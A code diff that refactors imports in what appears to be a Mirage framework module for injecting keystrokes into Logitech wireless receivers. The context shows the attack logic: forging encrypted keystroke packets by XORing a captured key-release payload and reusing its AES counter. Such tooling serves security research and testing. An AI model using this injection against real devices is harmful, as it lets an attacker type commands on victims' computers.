@@ -1,26 +1,32 @@
-from mirage.core import scenario
-from mirage.libs import io,esb,utils,wireless
-from mirage.libs.common import parsers
 from threading import Lock
+
+from mirage.core import scenario
+from mirage.libs import io, utils
+from mirage.libs.common import parsers
+from mirage.libs.esb_utils.dissectors import LogitechKeystroke
+from mirage.libs.esb_utils.packets import ESBLogitechEncryptedKeystrokePacket, ESBLogitechKeepAlivePacket, ESBLogitechSetTimeoutPacket
+from mirage.libs.wireless_utils.packetQueue import StoppableThread
+from mirage.libs.wireless_utils.packets import WaitPacket
+
 
 class logitech_encrypted_keystrokes_injection(scenario.Scenario):
 	def addLogitechKeystroke(self,locale="fr",key="a",ctrl=False, alt=False, gui=False,shift=False):
 		keystrokes = []
-		keystrokeUnencryptedPayload = esb.LogitechKeystroke(locale=locale,key=key,ctrl=ctrl,alt=alt,gui=gui,shift=shift).data
+		keystrokeUnencryptedPayload = LogitechKeystroke(locale=locale,key=key,ctrl=ctrl,alt=alt,gui=gui,shift=shift).data
 		forgedPayload = bytes([self.lastKeyRelease.hidData[i] ^ keystrokeUnencryptedPayload[i] for i in range(len(self.lastKeyRelease.hidData))])
 		io.info("Forged payload: "+forgedPayload.hex())
-		keystrokes.append(esb.ESBLogitechEncryptedKeystrokePacket(address=self.target,aesCounter=self.lastKeyRelease.aesCounter,unknown=self.lastKeyRelease.unknown,hidData = forgedPayload))
-		keystrokes.append(wireless.WaitPacket(time=12/1000.0))
-		keystrokes.append(esb.ESBLogitechKeepAlivePacket(address=self.target,timeout=1200))
-		keystrokes.append(esb.ESBLogitechEncryptedKeystrokePacket(address=self.target,aesCounter=self.lastKeyRelease.aesCounter,unknown=self.lastKeyRelease.unknown,hidData = self.lastKeyRelease.hidData))
+		keystrokes.append(ESBLogitechEncryptedKeystrokePacket(address=self.target,aesCounter=self.lastKeyRelease.aesCounter,unknown=self.lastKeyRelease.unknown,hidData = forgedPayload))
+		keystrokes.append(WaitPacket(time=12/1000.0))
+		keystrokes.append(ESBLogitechKeepAlivePacket(address=self.target,timeout=1200))
+		keystrokes.append(ESBLogitechEncryptedKeystrokePacket(address=self.target,aesCounter=self.lastKeyRelease.aesCounter,unknown=self.lastKeyRelease.unknown,hidData = self.lastKeyRelease.hidData))
 		return keystrokes
 
 	def addLogitechDelay(self,duration=1000):
 		keystrokes = []
 		number = int(duration / 10.0)
 		for _ in range(number):
-			keystrokes.append(esb.ESBLogitechKeepAlivePacket(address=self.target,timeout=1200))
-			keystrokes.append(wireless.WaitPacket(time=10.0/1000.0))
+			keystrokes.append(ESBLogitechKeepAlivePacket(address=self.target,timeout=1200))
+			keystrokes.append(WaitPacket(time=10.0/1000.0))
 		return keystrokes
 
 	def addLogitechText(self,string="hello world !",locale="fr"):
@@ -30,7 +36,7 @@ class logitech_encrypted_keystrokes_injection(scenario.Scenario):
 		return keystrokes
 
 	def startLogitechInjection(self,timeout=1200):
-		keystrokes=[esb.ESBLogitechSetTimeoutPacket(address=self.target,timeout=1200)]
+		keystrokes=[ESBLogitechSetTimeoutPacket(address=self.target,timeout=1200)]
 		return keystrokes
 
 	def keepAlive(self):
@@ -83,7 +89,7 @@ class logitech_encrypted_keystrokes_injection(scenario.Scenario):
 		elif "INTERACTIVE" in self.module.args and utils.booleanArg(self.module.args["INTERACTIVE"]):
 			self.mode = "interactive"
 			io.info("Interactive mode")
-			self.keepAliveThread = wireless.StoppableThread(self.keepAlive)
+			self.keepAliveThread = StoppableThread(self.keepAlive)
 			self.keepAliveThread.start()
 		elif "DUCKYSCRIPT" in self.module.args and self.module.args["DUCKYSCRIPT"] != "":
 			self.mode = "duckyscript"
